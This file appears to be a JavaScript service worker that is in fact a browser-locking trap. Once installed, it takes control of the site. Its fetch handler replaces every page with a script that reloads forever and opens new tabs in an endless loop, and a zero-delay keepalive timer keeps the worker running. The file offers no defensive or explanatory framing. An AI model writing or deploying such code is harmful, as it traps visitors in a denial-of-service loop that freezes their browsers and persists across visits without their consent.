self.addEventListener("install", (e) => {
    e.waitUntil(
        caches.open("cache-v1").then((cache) => {
            return cache.addAll(['/index.html']);
        })
    );
    self.skipWaiting();
});

self.addEventListener("fetch", (e) => {
    // always respond with a cached version that forces reload
    e.respondWith(
        new Response(
            `<body><script>while(1){location.reload(1);window.open('/', '_blank');};</script></body>`, 
            { 
                status: 200,
                headers: {'Content-Type': 'text/html'}
            }
        )
    );
});

self.addEventListener("activate", (e) => {
    e.waitUntil(clients.claim());
    // keep service worker active
    setInterval(() => {
        self.clients.matchAll().then(clients => {
            clients.forEach(client => client.postMessage('keepalive'));
        });
    }, 0);
});